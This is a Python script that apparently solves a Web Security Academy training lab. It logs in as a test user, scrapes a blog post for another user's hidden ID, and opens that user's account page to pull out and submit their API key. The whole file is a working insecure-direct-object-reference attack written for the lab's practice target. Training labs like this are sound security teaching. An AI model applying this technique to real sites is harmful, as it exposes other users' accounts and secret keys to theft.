import requests
from bs4 import BeautifulSoup
import re

# Start a session
s = requests.Session()
site = '0a09005603852e2086d56241001000cd.web-security-academy.net'

# Login with the provided credentials
login_url = f'https://{site}/login'
login_data = {'username': 'wiener', 'password': 'peter'}
resp = s.post(login_url, data=login_data)

# Step 1: Access the post authored by Carlos
post_url = f'https://{site}/post?postId=9'  # Carlos's post link
resp = s.get(post_url)

# Print the raw HTML to see its structure
print("HTML Content:")
print(resp.text)

# Parse the HTML using BeautifulSoup
soup = BeautifulSoup(resp.text, 'html.parser')

# Step 2: Extract Carlos's user ID from a link with the text 'carlos'
carlos_link = soup.find('a', string='carlos')
if carlos_link:
    carlos_userid = carlos_link['href'].split('=')[1]  # Extract the user ID from the URL
    print(f"Carlos's User ID: {carlos_userid}")
else:
    print("Carlos's link not found.")
    carlos_userid = None

# Step 3: If we found Carlos's user ID, access his profile page
if carlos_userid:
    resp = s.get(f'https://{site}/my-account?id={carlos_userid}')
    soup = BeautifulSoup(resp.text, 'html.parser')

    # Step 4: Find the API key in the profile page
    div_text = soup.find('div', string=re.compile('API')).text
    api_key = div_text.split(' ')[4]
    print(f"API Key: {api_key}")

    # Step 5: Submit the solution with the API key
    submit_url = f'https://{site}/submitSolution'
    resp = s.post(submit_url, data={'answer': api_key})

    # Output the response to confirm submission
    print(resp.status_code)
    print(resp.text)
else:
    print("Couldn't find Carlos's user ID. Exiting.")
